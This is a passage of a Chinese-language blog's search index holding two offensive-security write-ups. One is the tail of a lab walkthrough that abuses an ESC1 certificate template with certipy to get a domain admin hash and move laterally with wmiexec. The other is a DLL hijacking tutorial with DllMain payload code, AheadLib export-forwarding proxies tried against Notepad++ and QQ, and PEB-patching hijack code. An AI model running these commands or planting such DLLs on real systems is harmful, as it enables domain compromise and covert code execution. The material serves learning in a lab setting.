&#39;xiaorang-XIAORANG-DC-CA&#39; via CSRA</span><br><span class=\"line\">[!] Got error while trying to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39; via CSRA: Could not connect: [Errno 111] Connection refused</span><br><span class=\"line\">[*] Trying to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39; via RRP</span><br><span class=\"line\">[!] Got error while trying to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39; via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused</span><br><span class=\"line\">[!] Failed to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39;</span><br><span class=\"line\">[*] Enumeration output:</span><br><span class=\"line\">Certificate Authorities</span><br><span class=\"line\">  0</span><br><span class=\"line\">    CA Name                             : xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">    DNS Name                            : XIAORANG-DC.xiaorang.lab</span><br><span class=\"line\">    Certificate Subject                 : CN&#x3D;xiaorang-XIAORANG-DC-CA, DC&#x3D;xiaorang, DC&#x3D;lab</span><br><span class=\"line\">    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class=\"line\">    Certificate Validity Start          : 2023-07-14 04:33:21+00:00</span><br><span class=\"line\">    Certificate Validity End            : 2028-07-14 04:43:21+00:00</span><br><span class=\"line\">    Web Enrollment                      : Disabled</span><br><span class=\"line\">    User Specified SAN                  : Unknown</span><br><span class=\"line\">    Request Disposition                 : Unknown</span><br><span class=\"line\">    Enforce Encryption for Requests     : Unknown</span><br><span class=\"line\">Certificate Templates</span><br><span class=\"line\">  0</span><br><span class=\"line\">    Template Name                       : XR Manager</span><br><span class=\"line\">    Display Name                        : XR Manager</span><br><span class=\"line\">    Certificate Authorities             : xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">    Enabled                             : True</span><br><span class=\"line\">    Client Authentication               : True</span><br><span class=\"line\">    Enrollment Agent                    : False</span><br><span class=\"line\">    Any Purpose                         : False</span><br><span class=\"line\">    Enrollee Supplies Subject           : True</span><br><span class=\"line\">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class=\"line\">    Enrollment Flag                     : PublishToDs</span><br><span class=\"line\">                                          IncludeSymmetricAlgorithms</span><br><span class=\"line\">    Private Key Flag                    : ExportableKey</span><br><span class=\"line\">    Extended Key Usage                  : Encrypting File System</span><br><span class=\"line\">                                          Secure Email</span><br><span class=\"line\">                                          Client Authentication</span><br><span class=\"line\">    Requires Manager Approval           : False</span><br><span class=\"line\">    Requires Key Archival               : False</span><br><span class=\"line\">    Authorized Signatures Required      : 0</span><br><span class=\"line\">    Validity Period                     : 1 year</span><br><span class=\"line\">    Renewal Period                      : 6 weeks</span><br><span class=\"line\">    Minimum RSA Key Length              : 2048</span><br><span class=\"line\">    Permissions</span><br><span class=\"line\">      Enrollment Permissions</span><br><span class=\"line\">        Enrollment Rights               : XIAORANG.LAB\\Domain Admins</span><br><span class=\"line\">                                          XIAORANG.LAB\\Domain Users</span><br><span class=\"line\">                                          XIAORANG.LAB\\Enterprise Admins</span><br><span class=\"line\">                                          XIAORANG.LAB\\Authenticated Users</span><br><span class=\"line\">      Object Control Permissions</span><br><span class=\"line\">        Owner                           : XIAORANG.LAB\\Administrator</span><br><span class=\"line\">        Write Owner Principals          : XIAORANG.LAB\\Domain Admins</span><br><span class=\"line\">                                          XIAORANG.LAB\\Enterprise Admins</span><br><span class=\"line\">                                          XIAORANG.LAB\\Administrator</span><br><span class=\"line\">        Write Dacl Principals           : XIAORANG.LAB\\Domain Admins</span><br><span class=\"line\">                                          XIAORANG.LAB\\Enterprise Admins</span><br><span class=\"line\">                                          XIAORANG.LAB\\Administrator</span><br><span class=\"line\">        Write Property Principals       : XIAORANG.LAB\\Domain Admins</span><br><span class=\"line\">                                          XIAORANG.LAB\\Enterprise Admins</span><br><span class=\"line\">                                          XIAORANG.LAB\\Administrator</span><br><span class=\"line\">    [!] Vulnerabilities</span><br><span class=\"line\">      ESC1                              : &#39;XIAORANG.LAB\\\\Domain Users&#39; and &#39;XIAORANG.LAB\\\\Authenticated Users&#39; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302164249842.png\" alt=\"image-20250302164249842\"></p>\n<p>提示ESC1可利用一个易受攻击的证书模板 XR Manager，使用该模板为 XIAORANG\\Administrator 注册证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 certipy-ad req -u &#39;zhangxia@xiaorang.lab&#39; -p &#39;MyPass2@@6&#39; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &#39;xiaorang-XIAORANG-DC-CA&#39; -template &#39;XR Manager&#39; -upn &#39;administrator@xiaorang.lab&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302164932489.png\" alt=\"image-20250302164932489\"></p>\n<p>通过证书获取域管hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302165132461.png\" alt=\"image-20250302165132461\"></p>\n<p>wmiexec横向域控和DESKTOP</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec xiaorang.lab&#x2F;administrator@172.22.9.26 -hashes :2f1b57eefb2d152196836b0516abea80 -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure>\n\n","categories":["云境靶场"]},{"title":"初探DLL劫持","url":"/2024/11/07/DLL%E5%8A%AB%E6%8C%81/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824021558426.png\" alt=\"image-20220824021558426\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>浅学DLL相关</p>\n<h1 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h1><ul>\n<li>VS2022</li>\n<li><a href=\"https://blog.csdn.net/weixin_43997331/article/details/104764873\">cl.exe环境变量配置</a></li>\n</ul>\n<h1 id=\"什么是DLL\"><a href=\"#什么是DLL\" class=\"headerlink\" title=\"什么是DLL\"></a>什么是DLL</h1><p>DLL。在WIndows中DLL(Dynamic link library，动态链接库)是一个共享的库，其中包含可同时由多个程序使用的代码和数据，对常用函数和功能进行封装，这些DLL可实现不同的功能，每个DLL的功能实现可通过 <strong>导出函数来提供调用接口</strong>，在Windows的不同系统目录中存在大量的DLL文件，应用程序在实现时相应的功能时会调用这些DLL程序。</p>\n<p>动态库：在使用动态库时，往往提供两个文件：一个引入库（.lib，非必须）和一个.dll文件。.lib文件包含该动态库导出的函数和变量的符号名，而.dll文件包含该动态库实际的函数和数据。</p>\n<h1 id=\"DLL函数\"><a href=\"#DLL函数\" class=\"headerlink\" title=\"DLL函数\"></a>DLL函数</h1><p>在实现dll之前先搞懂几个预置的概念，dll文件所实现的功能是它的函数所提供的，分为两种：一、入口函数(DllMain)，二、导出函数。</p>\n<ul>\n<li>DllMain</li>\n</ul>\n<blockquote>\n<p>动态链接库的可选入口点 (DLL) 。 当系统启动或终止进程或线程时，它会使用进程的第一个线程调用每个已加载 DLL 的入口点函数。 当使用 LoadLibrary 和 FreeLibrary 函数加载或卸载 DLL 时，系统还会调用 DLL 的入口点函数。</p>\n</blockquote>\n<p>不是必须的函数，而且我们可以在不同的调用模式下写入我们自己的代码。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;pch.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\">BOOL APIENTRY <span class=\"title\">DllMain</span><span class=\"params\">( HMODULE hModule, <span class=\"comment\">//  DLL模块的句柄</span></span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                       DWORD  ul_reason_for_call, <span class=\"comment\">// 调用函数的原因</span></span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                       LPVOID lpReserved  <span class=\"comment\">// 保留参数</span></span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                     )</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (ul_reason_for_call)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_PROCESS_ATTACH:      <span class=\"comment\">// 进程加载DLL触发( LoadLibraryA)</span></span><br><span class=\"line\">        &#123;  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;DLL_PROCESS_ATTACH!\\n&quot;</span>);</span><br><span class=\"line\">        WinExec(<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"number\">0</span>); <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_THREAD_ATTACH:       <span class=\"comment\">// 进程创建新线程加载触发(CreateThread)</span></span><br><span class=\"line\">        &#123;  <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_THREAD_DETACH:       <span class=\"comment\">// 线程正常退出(CreateThread-Return)</span></span><br><span class=\"line\">        &#123;  <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_PROCESS_DETACH:      <span class=\"comment\">// 进程卸载DLL(函数：FreeLibrary、FreeLibraryAndExitThread)</span></span><br><span class=\"line\">        &#123; <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>导出函数</li>\n</ul>\n<p>将我们写的函数导出的方式有两种：一、使用 __declspec(dllexport) ，二、使用模块定义（.def）文件。这里只记录一下第一种。</p>\n<p>mydll.c，在函数前加上关键字__declspec(dllexport)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__declspec(dllexport) <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">calc</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    system(<span class=\"string\">&quot;cmd /c calc&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>另外我们可以使用 <strong>dumpbin</strong> 命令查看dll文件的导出函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">dumpbin mydll.dll &#x2F;exports</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815161028072.png\" alt=\"image-20220815161028072\"></p>\n<p>针对于C++编译器，编译后的函数名为 fnDll2@xxxxx ，这是因为c++编译器基于函数重载的考虑，会更改函数名，为了避免这种现象，可以使用 <strong>extern “C”</strong> 指令来命令c++编译器以c编译器的方式来命名该函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">extern &quot;C&quot; __declspec(dllexport) void calc()&#123;</span><br><span class=\"line\">    system(&quot;cmd &#x2F;c calc&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815172231208.png\" alt=\"image-20220815172231208\"></p>\n<h1 id=\"DLL创建\"><a href=\"#DLL创建\" class=\"headerlink\" title=\"DLL创建\"></a>DLL创建</h1><h2 id=\"命令行\"><a href=\"#命令行\" class=\"headerlink\" title=\"命令行\"></a>命令行</h2><p>利用微软cl.exe，将mydll.c编译成dll文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cl mydll.c &#x2F;LD</span><br></pre></td></tr></table></figure>\n\n<p>多了lib文件和dll文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815161203906.png\" alt=\"image-20220815161203906\"></p>\n<h2 id=\"VS\"><a href=\"#VS\" class=\"headerlink\" title=\"VS\"></a>VS</h2><p>提供两种</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815162302951.png\" alt=\"image-20220815162302951\"></p>\n<p>选择具有导出项的动态链接库，编写恶意代码。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815163409170.png\" alt=\"image-20220815163409170\"></p>\n<h1 id=\"加载DLL\"><a href=\"#加载DLL\" class=\"headerlink\" title=\"加载DLL\"></a>加载DLL</h1><p>dll的加载有两种方式</p>\n<ul>\n<li>隐式调用（load-time dynamic linking）也叫静态链接</li>\n</ul>\n<p>使用 <strong>#include &lt;xxx.h&gt;**导入头文件和 **#pragma comment(lib, “xxx.lib”)</strong> 导入链接库文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;testDLL.h&quot;</span><br><span class=\"line\">#pragma  comment(lib,&quot;testDLL.lib&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>右键解决方案，添加新建控制台应用，项目名称为Test，编写程序调用dll中的函数。ctrl+f5运行。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815173612769.png\" alt=\"image-20220815173612769\"></p>\n<p>如果调用的函数在恶意dll文件中不存在，程序会报出错误，并且也<strong>不会执行DllMain函数</strong></p>\n<ul>\n<li>显式调用（run-time dynamic linking）也叫动态链接</li>\n</ul>\n<p>通过 <strong>LoadLiabrary</strong> 函数显示加载dll。需要注意的是这时候我们不再需要注册.lib文件，也不需要声明外部函数。只要在需要使用的地方调用dll文件即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">void</span><span class=\"params\">(*DLLFUNC)</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span>;  <span class=\"comment\">//定义函数指针</span></span><br><span class=\"line\">    DLLFUNC func = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    HINSTANCE DLL = LoadLibrary(<span class=\"string\">L&quot;Dll2.dll&quot;</span>);  <span class=\"comment\">//DLL句柄</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (DLL != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        func = (DLLFUNC)GetProcAddress(DLL, <span class=\"string\">&quot;?fnDll2@@YAHXZ&quot;</span>); <span class=\"comment\">//获取函数地址</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (func != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">            func();  <span class=\"comment\">//调用</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        FreeLibrary(DLL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;test123&quot;</span>);  <span class=\"comment\">//卸载dll</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>有个注意的点，这里要使用被修饰的函数名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815180738493.png\" alt=\"image-20220815180738493\"></p>\n<p>修改.h文件即可使用原函数名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">extern &quot;C&quot; __declspec(dllexport) int fnDll2(void);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815180925346.png\" alt=\"image-20220815180925346\"></p>\n<p>即使调用了不存在的函数，不会报错，也 <strong>会执行DllMain函数</strong></p>\n<h1 id=\"DLL劫持\"><a href=\"#DLL劫持\" class=\"headerlink\" title=\"DLL劫持\"></a>DLL劫持</h1><p>如果在进程尝试加载一个DLL时没有并没有 <strong>指定DLL的绝对路径</strong>，那么Windows会尝试去按照顺序搜索这些特定目录来查找这个DLL,如果攻击者能够将恶意的DLL放在优先于正常DLL所在的目录，那么就能够欺骗系统去加载恶意的DLL。</p>\n<h1 id=\"DLL加载顺序\"><a href=\"#DLL加载顺序\" class=\"headerlink\" title=\"DLL加载顺序\"></a>DLL加载顺序</h1><p>在程序通过上述两种方式加载DLL时，都会进行DLL的搜索。会加载搜索过程中找到的第一个名称正确的DLL。系统搜索DLL之前，它会检查以下内容，如果已经存在了就不会搜索DLL：</p>\n<ul>\n<li><p>如果内存中已经加载了具有相同模块名称的 DLL</p>\n</li>\n<li><p>KnownDLLs注册表项（HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs）</p>\n</li>\n</ul>\n<p>上面都没有找到DLL的情况下，如果启用了 <strong>SafeDllSearchMode</strong>， 就按照如下搜索顺序搜索：</p>\n<ul>\n<li><p>应用程序加载目录(安装目录)</p>\n</li>\n<li><p>系统目录(C:\\Windows\\System32，使用 GetSystemDirectory 函数获取)</p>\n</li>\n<li><p>16 位系统目录(C:\\Windows\\System)</p>\n</li>\n<li><p>Windows 目录(C:\\Windows,使用 GetWindowsDirectory函数获取)</p>\n</li>\n<li><p>当前目录</p>\n</li>\n<li><p>PATH 环境变量中列出的目录</p>\n</li>\n</ul>\n<p>如果 <strong>SafeDllSearchMode</strong> 已禁用，则搜索顺序如下：</p>\n<ul>\n<li><p>应用程序加载目录(安装目录)</p>\n</li>\n<li><p>当前目录</p>\n</li>\n<li><p>系统目录(C:\\Windows\\System32，使用 GetSystemDirectory 函数获取)</p>\n</li>\n<li><p>16 位系统目录(C:\\Windows\\System)</p>\n</li>\n<li><p>Windows 目录(C:\\Windows,使用 GetWindowsDirectory函数获取)</p>\n</li>\n<li><p>PATH 环境变量中列出的目录</p>\n</li>\n</ul>\n<p>PS: Windows操作系统通过 <strong>DLL路径搜索目录顺序</strong> 和 <strong>Know DLLs注册表项</strong> 的机制来确定应用程序所要调用的DLL的路经，之后，应用程序就将DL_L载入了自己的内存空间，执行相应的函数功能。</p>\n<p>Know DLLs注册表项 <strong>指定的DLL</strong> 是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"DLL劫持发现\"><a href=\"#DLL劫持发现\" class=\"headerlink\" title=\"DLL劫持发现\"></a>DLL劫持发现</h1><h2 id=\"Process-Monitor\"><a href=\"#Process-Monitor\" class=\"headerlink\" title=\"Process Monitor\"></a>Process Monitor</h2><p>利用 Process Monitor 手动挖掘，设置为：</p>\n<p>允许这些</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Operation is CreateFile</span><br><span class=\"line\">Operation is Load Image</span><br><span class=\"line\">Path contains .cpl</span><br><span class=\"line\">Path contains .dll</span><br><span class=\"line\">Path contains .drv</span><br><span class=\"line\">Path contains .exe</span><br><span class=\"line\">Path contains .ocx</span><br><span class=\"line\">Path contains .scr</span><br><span class=\"line\">Path contains .sys</span><br></pre></td></tr></table></figure>\n\n<p>排除这些</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Process Name is procmon.exe</span><br><span class=\"line\">Process Name is Procmon64.exe</span><br><span class=\"line\">Process Name is System</span><br><span class=\"line\">Operation begins with IRP_MJ_</span><br><span class=\"line\">Operation begins with FASTIO_</span><br><span class=\"line\">Result is SUCCESS</span><br><span class=\"line\">Path ends with pagefile.sys</span><br></pre></td></tr></table></figure>\n\n<p>运行上面编译生成的exe，目录下没有dll文件单独执行，按照加载顺序进行加载dll文件，其次存在 <strong>LoadLibrary(Ex)</strong> 说明该dll文件是被进程动态加载，这样直接使用恶意dllmain函数的dll文件即可利用。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816011747152.png\" alt=\"image-20220816011747152\"></p>\n<p>这里拿notepad++6.6.6试试，发现直接就加载当前目录下的SciLexer.dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816022407377.png\" alt=\"image-20220816022407377\"></p>\n<p>写一个dll，尝试在DllMain函数中弹个计算器，替换后执行exe</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816022657161.png\" alt=\"image-20220816022657161\"></p>\n<p>虽然成功加载Dllmain函数进行劫持，但是缺点也很明显，当调用后续函数时，报错没法执行，为了解决这种情况，下面要学一下DLL中的转发，悄无声息的执行我们的代码。</p>\n<h2 id=\"自动化工具\"><a href=\"#自动化工具\" class=\"headerlink\" title=\"自动化工具\"></a>自动化工具</h2><p>ImpulsiveDLLHijack、Rattler、Robber等</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816014408409.png\" alt=\"image-20220816014408409\"></p>\n<h2 id=\"其他方式\"><a href=\"#其他方式\" class=\"headerlink\" title=\"其他方式\"></a>其他方式</h2><p>发现个骚的手法，单独把exe拉出来运行，看报什么错</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816014644209.png\" alt=\"image-20220816014644209\"></p>\n<p>或者本目录下排除法删除dll文件，加载中的DLL因为句柄占用无法删除。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816023026821.png\" alt=\"image-20220816023026821\"></p>\n<h1 id=\"DLL劫持利用\"><a href=\"#DLL劫持利用\" class=\"headerlink\" title=\"DLL劫持利用\"></a>DLL劫持利用</h1><h2 id=\"替换dll\"><a href=\"#替换dll\" class=\"headerlink\" title=\"替换dll\"></a>替换dll</h2><p>submitline，加载当前目录下的dbghelp.dll。写个同名恶意dll即可利用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220822144647915.png\" alt=\"image-20220822144647915\"></p>\n<h2 id=\"转发劫持\"><a href=\"#转发劫持\" class=\"headerlink\" title=\"转发劫持\"></a>转发劫持</h2><p>利用工具创建出具有转发功能的恶意dll，在程序调用某个函数时，先调用恶意dll，再转发调用原始dll中的函数，这里就分为两种，直接转发与即时调用，直接转发的利用方式只能在DllMain中利用，即时调用是在恶意dll中加载原始dll中某个函数的地址，然后进行调用，这样可以在恶意dll中创建同名函数，插入恶意代码，然后进行寻址调用，达到转发目的。</p>\n<p>这里利用工具：<a href=\"https://bbs.pediy.com/thread-224408.htm\">AheadLib修改 支持x64支持类/命名空间</a></p>\n<h3 id=\"直接转发\"><a href=\"#直接转发\" class=\"headerlink\" title=\"直接转发\"></a>直接转发</h3><p>以QQ为例子，对libuv.dll进行转发，AheadLib+生成一个cpp文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004503216.png\" alt=\"image-20220823004503216\"></p>\n<p>vs 新建 DLL项目后，添加上代码，可以看到原dll文件有许多导出函数 ，通过这句话实现函数的转发</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma comment(linker, &quot;&#x2F;EXPORT:Scintilla_DirectFunction&#x3D;SciLexerOrg.Scintilla_DirectFunction,@1&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>main函数加上代码，生成32位的dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004354009.png\" alt=\"image-20220823004354009\"></p>\n<p>改变原dll文件名，Org为原始dll。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004442303.png\" alt=\"image-20220823004442303\"></p>\n<p>双击qq弹出计算器</p>\n<p>这种方法会出现一种情况，虽然先调用了恶意dll后转发到原始dll，但是不清楚主程序的需求是什么可能是一个返回值，也可能参数不正确，这个时候都会导致主程序运行出错。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823005011353.png\" alt=\"image-20220823005011353\"></p>\n<h3 id=\"即时调用\"><a href=\"#即时调用\" class=\"headerlink\" title=\"即时调用\"></a>即时调用</h3><p>说白了就是在恶意dll文件中多加几行代码，LoadLibrary原始dll后通过GetAddress获取函数地址，然后跳到导出函数的地址，实现在恶意dll中进行调用原始函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010058231.png\" alt=\"image-20220823010058231\"></p>\n<p>main函数中调用load函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010341471.png\" alt=\"image-20220823010341471\"></p>\n<p>加载原始dll文件后调用 InitializeAddresses</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010409242.png\" alt=\"image-20220823010409242\"></p>\n<p>InitializeAddresses 获取原函数地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010504677.png\" alt=\"image-20220823010504677\"></p>\n<p>当通过调用函数时，进行转发到 _AheadLib_Scintilla_DirectFunction</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma comment(linker, &quot;&#x2F;EXPORT:Scintilla_DirectFunction&#x3D;_AheadLib_Scintilla_DirectFunction,@1&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>这个就是通过上面的原函数地址进行跳转调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010612582.png\" alt=\"image-20220823010612582\"></p>\n<p>效果：payload执行并且不影响正常使用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010231062.png\" alt=\"image-20220823010231062\"></p>\n<h2 id=\"一种更加通用的方式\"><a href=\"#一种更加通用的方式\" class=\"headerlink\" title=\"一种更加通用的方式\"></a>一种更加通用的方式</h2><p>参考文章：<a href=\"https://bbs.pediy.com/thread-248050-1.htm\">一种通用DLL劫持技术研究-编程技术-看雪论坛</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void* NtCurrentPeb()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm &#123;</span><br><span class=\"line\">        mov eax, fs:[0x30];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">PEB_LDR_DATA* NtGetPebLdr(void* peb)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm &#123;</span><br><span class=\"line\">        mov eax, peb;</span><br><span class=\"line\">        mov eax, [eax + 0xc];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    WCHAR wszDllName[100] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">    void* peb &#x3D; NtCurrentPeb();</span><br><span class=\"line\">    PEB_LDR_DATA* ldr &#x3D; NtGetPebLdr(peb);</span><br><span class=\"line\"> </span><br><span class=\"line\">    for (LIST_ENTRY* entry &#x3D; ldr-&gt;InLoadOrderModuleList.Blink;</span><br><span class=\"line\">        entry !&#x3D; (LIST_ENTRY*)(&amp;ldr-&gt;InLoadOrderModuleList);</span><br><span class=\"line\">        entry &#x3D; entry-&gt;Blink) &#123;</span><br><span class=\"line\">        PLDR_DATA_TABLE_ENTRY data &#x3D; (PLDR_DATA_TABLE_ENTRY)entry;</span><br><span class=\"line\"> </span><br><span class=\"line\">        memset(wszDllName, 0, 100 * 2);</span><br><span class=\"line\">        memcpy(wszDllName, data-&gt;BaseDllName.Buffer, data-&gt;BaseDllName.Length);</span><br><span class=\"line\"> </span><br><span class=\"line\">        if (!_wcsicmp(wszDllName, dllname)) &#123;</span><br><span class=\"line\">            data-&gt;DllBase &#x3D; hMod;</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">VOID DllHijack(HMODULE hMod)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    TCHAR tszDllPath[MAX_PATH] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">    GetModuleFileName(hMod, tszDllPath, MAX_PATH);</span><br><span class=\"line\">    PathRemoveFileSpec(tszDllPath);</span><br><span class=\"line\">    PathAppend(tszDllPath, TEXT(&quot;mydll.dll.1&quot;));</span><br><span class=\"line\"> </span><br><span 